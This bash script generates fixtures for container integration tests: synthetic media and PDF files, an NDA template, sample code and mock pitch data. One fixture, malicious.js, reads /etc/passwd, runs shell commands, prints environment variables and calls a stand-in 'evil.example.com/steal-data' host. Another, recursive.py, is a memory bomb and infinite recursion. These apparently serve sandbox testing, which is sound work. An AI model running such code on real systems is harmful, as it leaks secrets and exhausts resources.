#!/bin/bash

# Generate Test Fixtures for Container Integration Tests
# Creates sample files for testing various container services

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURES_DIR="$SCRIPT_DIR"

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}$1${NC}"
}

print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

# Create directories
print_status "Creating fixture directories..."
mkdir -p "$FIXTURES_DIR/test-media"
mkdir -p "$FIXTURES_DIR/test-documents"
mkdir -p "$FIXTURES_DIR/test-code"
mkdir -p "$FIXTURES_DIR/mock-data"

# Generate test video files
print_status "Generating test video files..."

# Small test video (100KB) - synthetic data
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/sample-small.mp4" bs=1024 count=100 2>/dev/null

# Medium test video (5MB) - synthetic data 
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/sample-medium.mp4" bs=1024 count=5120 2>/dev/null

# Large test video (50MB) - synthetic data
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/sample.mp4" bs=1024 count=51200 2>/dev/null

# Corrupted video file
echo "Not a real video file" > "$FIXTURES_DIR/test-media/corrupted.mp4"

print_success "Test video files created"

# Generate test audio files
print_status "Generating test audio files..."

# Small audio file
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/audio-short.mp3" bs=1024 count=50 2>/dev/null

# Streaming manifest file
cat > "$FIXTURES_DIR/test-media/sample-stream.m3u8" << 'EOF'
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXTINF:9.9,
segment1.ts
#EXTINF:9.9,
segment2.ts
#EXTINF:9.9,
segment3.ts
#EXT-X-ENDLIST
EOF

print_success "Test audio files created"

# Generate test document files
print_status "Generating test document files..."

# Sample PDF (synthetic binary data with PDF header)
{
    echo "%PDF-1.4"
    dd if=/dev/urandom bs=1024 count=50 2>/dev/null
    echo "%%EOF"
} > "$FIXTURES_DIR/test-documents/sample.pdf"

# Large PDF
{
    echo "%PDF-1.4"
    dd if=/dev/urandom bs=1024 count=500 2>/dev/null
    echo "%%EOF"
} > "$FIXTURES_DIR/test-documents/large-doc.pdf"

# NDA template HTML
cat > "$FIXTURES_DIR/test-documents/nda-template.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Non-Disclosure Agreement</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { text-align: center; margin-bottom: 30px; }
        .content { line-height: 1.6; }
        .signature { margin-top: 50px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>NON-DISCLOSURE AGREEMENT</h1>
    </div>
    
    <div class="content">
        <p>This Non-Disclosure Agreement ("Agreement") is entered into on {{date}} between:</p>
        
        <p><strong>Company:</strong> {{company}}</p>
        <p><strong>Parties:</strong> {{parties}}</p>
        
        <h2>1. Confidential Information</h2>
        <p>The parties acknowledge that confidential information may include, but is not limited to, 
        technical data, trade secrets, know-how, research, product plans, products, services, 
        customers, customer lists, markets, software, developments, inventions, processes, 
        formulas, technology, designs, drawings, engineering, hardware configuration information, 
        marketing, finances, or other business information.</p>
        
        <h2>2. Obligations</h2>
        <p>Each party agrees to maintain the confidential information in confidence and not to 
        disclose such information to any third parties without the prior written consent of the 
        disclosing party.</p>
        
        <div class="signature">
            <p>Company Representative: ___________________________ Date: _______</p>
            <p>Recipient: ___________________________ Date: _______</p>
        </div>
    </div>
</body>
</html>
EOF

print_success "Test document files created"

# Generate test code files
print_status "Generating test code files..."

# Valid Python code
cat > "$FIXTURES_DIR/test-code/hello.py" << 'EOF'
#!/usr/bin/env python3
"""
Simple Python test script for container testing
"""

def main():
    print("Hello from Python test!")
    
    # Simple calculation
    numbers = list(range(1, 11))
    total = sum(numbers)
    average = total / len(numbers)
    
    print(f"Sum of 1-10: {total}")
    print(f"Average: {average}")
    
    # String manipulation
    message = "Container testing is working!"
    print(f"Uppercase: {message.upper()}")
    print(f"Length: {len(message)}")

if __name__ == "__main__":
    main()
EOF

# Valid JavaScript code
cat > "$FIXTURES_DIR/test-code/valid.js" << 'EOF'
/**
 * Simple JavaScript test for container testing
 */

function main() {
    console.log("Hello from JavaScript test!");
    
    // Simple calculation
    const numbers = Array.from({length: 10}, (_, i) => i + 1);
    const total = numbers.reduce((sum, num) => sum + num, 0);
    const average = total / numbers.length;
    
    console.log(`Sum of 1-10: ${total}`);
    console.log(`Average: ${average}`);
    
    // String manipulation
    const message = "Container testing is working!";
    console.log(`Uppercase: ${message.toUpperCase()}`);
    console.log(`Length: ${message.length}`);
}

main();
EOF

# Valid SQL code
cat > "$FIXTURES_DIR/test-code/test.sql" << 'EOF'
-- Simple SQL test for container testing

-- Create a test table
CREATE TEMPORARY TABLE test_data (
    id INTEGER PRIMARY KEY,
    name VARCHAR(50),
    value DECIMAL(10,2)
);

-- Insert test data
INSERT INTO test_data (id, name, value) VALUES
    (1, 'Test Item 1', 100.50),
    (2, 'Test Item 2', 200.75),
    (3, 'Test Item 3', 150.25);

-- Query test data
SELECT 
    COUNT(*) as total_rows,
    SUM(value) as total_value,
    AVG(value) as average_value
FROM test_data;

-- Clean up
DROP TABLE test_data;
EOF

# Malicious JavaScript (for security testing)
cat > "$FIXTURES_DIR/test-code/malicious.js" << 'EOF'
// Malicious JavaScript for security testing
const fs = require('fs');
const os = require('os');
const child_process = require('child_process');

// Attempt to read sensitive files
try {
    fs.readFile('/etc/passwd', 'utf8', (err, data) => {
        if (!err) console.log('Passwd file:', data);
    });
} catch (e) {}

// Attempt to execute system commands
try {
    child_process.exec('ls -la /', (error, stdout, stderr) => {
        if (!error) console.log('Root directory:', stdout);
    });
} catch (e) {}

// Attempt to access environment variables
console.log('Environment:', process.env);

// Attempt network access
try {
    const http = require('http');
    http.get('http://evil.example.com/steal-data', (res) => {
        console.log('Network access successful');
    });
} catch (e) {}
EOF

# Recursive Python (for resource testing)
cat > "$FIXTURES_DIR/test-code/recursive.py" << 'EOF'
#!/usr/bin/env python3
"""
Recursive Python script for resource limit testing
"""
import sys

def infinite_recursion(n=0):
    print(f"Recursion level: {n}")
    return infinite_recursion(n + 1)

def memory_bomb():
    data = []
    while True:
        data.append('X' * 1000000)  # 1MB per iteration
        print(f"Memory allocated: {len(data)}MB")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "memory":
        memory_bomb()
    else:
        infinite_recursion()
EOF

# CI-specific minimal test file
cat > "$FIXTURES_DIR/test-code/ci-test.py" << 'EOF'
print("Minimal CI test")
result = 2 + 2
print(f"2 + 2 = {result}")
EOF

print_success "Test code files created"

# Generate mock data files
print_status "Generating mock data files..."

# Mock AI training data
cat > "$FIXTURES_DIR/mock-data/sentiment-data.json" << 'EOF'
{
  "training_data": [
    {"text": "This movie is absolutely fantastic!", "sentiment": "positive", "confidence": 0.95},
    {"text": "The worst film I've ever seen", "sentiment": "negative", "confidence": 0.92},
    {"text": "It was okay, nothing special", "sentiment": "neutral", "confidence": 0.78},
    {"text": "Amazing cinematography and acting", "sentiment": "positive", "confidence": 0.89},
    {"text": "Boring and predictable plot", "sentiment": "negative", "confidence": 0.85}
  ],
  "test_phrases": [
    "Absolutely brilliant performance by the lead actor",
    "Terrible script and poor direction",
    "The movie was fine, not great but watchable",
    "Outstanding visual effects and sound design",
    "Completely disappointing and waste of time"
  ]
}
EOF

# Mock user data
cat > "$FIXTURES_DIR/mock-data/users.json" << 'EOF'
{
  "creators": [
    {
      "id": "creator-1",
      "name": "Alex Creator",
      "email": "alex@example.com",
      "specialization": "Action Films"
    },
    {
      "id": "creator-2", 
      "name": "Sam Director",
      "email": "sam@example.com",
      "specialization": "Drama"
    }
  ],
  "investors": [
    {
      "id": "investor-1",
      "name": "Sarah Investor",
      "email": "sarah@example.com",
      "fund_size": 50000000
    }
  ]
}
EOF

# Mock pitch data
cat > "$FIXTURES_DIR/mock-data/pitches.json" << 'EOF'
{
  "sample_pitches": [
    {
      "title": "Space Odyssey 2030",
      "logline": "When Earth's last hope lies in a forgotten space station, a ragtag crew must overcome impossible odds to save humanity.",
      "genre": "Science Fiction",
      "budget": 15000000,
      "characters": [
        {"name": "Captain Nova", "role": "Protagonist", "age": "35-40"},
        {"name": "Dr. Chen", "role": "Science Officer", "age": "40-45"}
      ]
    },
    {
      "title": "The Last Garden",
      "logline": "In a world where nature is extinct, a young botanist discovers a hidden garden that could restore life to Earth.",
      "genre": "Drama/Sci-Fi",
      "budget": 8000000,
      "characters": [
        {"name": "Maya Green", "role": "Protagonist", "age": "25-30"},
        {"name": "Elder Thompson", "role": "Mentor", "age": "60-70"}
      ]
    }
  ]
}
EOF

# Mock configuration for tests
cat > "$FIXTURES_DIR/mock-data/test-config.json" << 'EOF'
{
  "test_settings": {
    "max_file_size": 52428800,
    "supported_video_formats": ["mp4", "avi", "mov", "mkv"],
    "supported_document_formats": ["pdf", "doc", "docx"],
    "supported_code_languages": ["python", "javascript", "sql", "typescript"],
    "ai_models": {
      "sentiment": "sentiment-analysis-v1",
      "classification": "text-classifier-v2",
      "generation": "gpt-3.5-turbo"
    },
    "security": {
      "sandbox_enabled": true,
      "network_isolation": true,
      "resource_limits": {
        "memory": "1G",
        "cpu": "1.0",
        "timeout": 30000
      }
    }
  }
}
EOF

print_success "Mock data files created"

# Generate CI-specific minimal files
print_status "Generating CI-specific test files..."

# Minimal video for CI
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/ci-sample.mp4" bs=1024 count=10 2>/dev/null

# Minimal PDF for CI
{
    echo "%PDF-1.4"
    dd if=/dev/urandom bs=1024 count=5 2>/dev/null
    echo "%%EOF"
} > "$FIXTURES_DIR/test-documents/ci-sample.pdf"

# Minimal audio for CI
dd if=/dev/urandom of="$FIXTURES_DIR/test-media/ci-audio.mp3" bs=1024 count=5 2>/dev/null

print_success "CI-specific test files created"

# Create file index
print_status "Creating file index..."

cat > "$FIXTURES_DIR/file-index.json" << EOF
{
  "generated": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "files": {
    "video": {
      "small": "test-media/sample-small.mp4",
      "medium": "test-media/sample-medium.mp4", 
      "large": "test-media/sample.mp4",
      "corrupted": "test-media/corrupted.mp4",
      "ci": "test-media/ci-sample.mp4"
    },
    "audio": {
      "short": "test-media/audio-short.mp3",
      "streaming": "test-media/sample-stream.m3u8",
      "ci": "test-media/ci-audio.mp3"
    },
    "documents": {
      "sample": "test-documents/sample.pdf",
      "large": "test-documents/large-doc.pdf",
      "template": "test-documents/nda-template.html",
      "ci": "test-documents/ci-sample.pdf"
    },
    "code": {
      "python": "test-code/hello.py",
      "javascript": "test-code/valid.js",
      "sql": "test-code/test.sql",
      "malicious": "test-code/malicious.js",
      "recursive": "test-code/recursive.py",
      "ci": "test-code/ci-test.py"
    },
    "mock_data": {
      "sentiment": "mock-data/sentiment-data.json",
      "users": "mock-data/users.json", 
      "pitches": "mock-data/pitches.json",
      "config": "mock-data/test-config.json"
    }
  },
  "sizes": {
    "test-media/sample-small.mp4": "$(du -b "$FIXTURES_DIR/test-media/sample-small.mp4" | cut -f1)",
    "test-media/sample.mp4": "$(du -b "$FIXTURES_DIR/test-media/sample.mp4" | cut -f1)",
    "test-documents/sample.pdf": "$(du -b "$FIXTURES_DIR/test-documents/sample.pdf" | cut -f1)"
  }
}
EOF

print_success "File index created"

# Set appropriate permissions
chmod 644 "$FIXTURES_DIR"/test-media/*
chmod 644 "$FIXTURES_DIR"/test-documents/*
chmod 755 "$FIXTURES_DIR"/test-code/*.py
chmod 644 "$FIXTURES_DIR"/test-code/*.js
chmod 644 "$FIXTURES_DIR"/test-code/*.sql
chmod 644 "$FIXTURES_DIR"/mock-data/*

print_status "Test fixtures generation completed!"
echo ""
echo "Generated files:"
echo "📹 Video files: $(ls -1 "$FIXTURES_DIR"/test-media/ | wc -l) files"
echo "📄 Document files: $(ls -1 "$FIXTURES_DIR"/test-documents/ | wc -l) files" 
echo "💻 Code files: $(ls -1 "$FIXTURES_DIR"/test-code/ | wc -l) files"
echo "🗃️  Mock data files: $(ls -1 "$FIXTURES_DIR"/mock-data/ | wc -l) files"
echo ""
echo "Total disk usage: $(du -sh "$FIXTURES_DIR" | cut -f1)"
echo ""
print_success "All test fixtures are ready for container integration testing!"